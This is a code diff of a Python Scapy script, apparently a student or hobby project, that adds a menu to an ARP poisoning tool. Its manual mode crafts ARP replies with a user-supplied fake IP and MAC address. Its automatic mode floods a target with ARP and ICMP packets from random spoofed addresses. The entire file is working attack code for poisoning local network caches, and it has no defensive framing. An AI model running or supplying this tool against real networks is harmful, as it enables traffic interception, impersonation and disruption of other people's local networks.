@@ -1,5 +1,6 @@
 from scapy.all import *
 import os
+import random
 
 def main():
     os.system("clear")
@@ -9,6 +10,39 @@ def main():
     ICMP_Packet = IP()
     ARP_Packet.op = 2
 
+    Menu(ARP_Packet,ICMP_Packet)
+
+    print "\n### Emre OVUNC && Ayse Simge OZGER ###\n"
+    
+def SourceIP(ARP_Packet,ICMP_Packet):
+    srcIP = raw_input ("Fake IP : ")
+    ARP_Packet.psrc = srcIP
+    ICMP_Packet.src = srcIP
+
+def DestinationIP(ARP_Packet,ICMP_Packet):
+    dstIP= raw_input ("\nDestination IP : ")
+    ARP_Packet.pdst = dstIP
+    ICMP_Packet.dst = dstIP
+
+def SourceHW(ARP_Packet):
+    fakeMAC = raw_input ("Fake MAC : ")
+    ARP_Packet.hwsrc = fakeMAC
+
+def DestinationHW(ARP_Packet):
+    dstMAC = raw_input ("Destination MAC : ")
+    ARP_Packet.hwdst = dstMAC
+
+def randomMAC():
+    mac = [ 0x00, 0x16, 0x3e,random.randint(0x00, 0x7f),random.randint(0x00, 0xff),random.randint(0x00, 0xff) ]
+    return ':'.join(map(lambda x: "%02x" % x, mac))
+
+def randomIP():
+    ip = "192.168.1."
+    last = ".".join(map(str, (random.randint(0, 255)for _ in range(1))))
+    ip = ip+last
+    return ip
+
+def ARP_Poisoning(ARP_Packet,ICMP_Packet):
     DestinationIP(ARP_Packet,ICMP_Packet)
     DestinationHW(ARP_Packet)
     SourceIP(ARP_Packet,ICMP_Packet)
@@ -22,24 +56,29 @@ def main():
     send(ICMP_Packet)
     send(ARP_Packet)
 
-    print "\n### Emre OVUNC && Ayse Simge OZGER ###\n"
+def AutoARP(ARP_Packet,ICMP_Packet):
+    ARP_Packet.hwsrc = randomMAC()
+    randIP = randomIP()
+    ARP_Packet.psrc = randIP
+    ICMP_Packet.src = randIP
+
+    send(ICMP_Packet)
+    send(ARP_Packet)
     
-def SourceIP(ARP_Packet,ICMP_Packet):
-    srcIP = raw_input ("Fake IP : ")
-    ARP_Packet.psrc = srcIP
-    ICMP_Packet.src = srcIP
+def Menu(ARP_Packet,ICMP_Packet):
+    print "[1] - Manual ARP Poisoning\n[2] - Auto ARP Packet Generation\n"
+    answer = input("Enter [1] or [2] : ")
 
-def DestinationIP(ARP_Packet,ICMP_Packet):
-    dstIP= raw_input ("Destination IP : ")
-    ARP_Packet.pdst = dstIP
-    ICMP_Packet.dst = dstIP
+    if answer==1:
+	ARP_Poisoning(ARP_Packet,ICMP_Packet)
+    elif answer==2:
+	DestinationIP(ARP_Packet,ICMP_Packet)
+	cycle = input("How many fake ARP packets you want to generate: ")
+	for x in range (0,cycle):
+	    AutoARP(ARP_Packet,ICMP_Packet)
+    else:
+	print "[ERROR] Wrong Input !!!"
+	main()
 
-def SourceHW(ARP_Packet):
-    fakeMAC = raw_input ("Fake MAC : ")
-    ARP_Packet.hwsrc = fakeMAC
-
-def DestinationHW(ARP_Packet):
-    dstMAC = raw_input ("Destination MAC : ")
-    ARP_Packet.hwdst = dstMAC
   
 main()
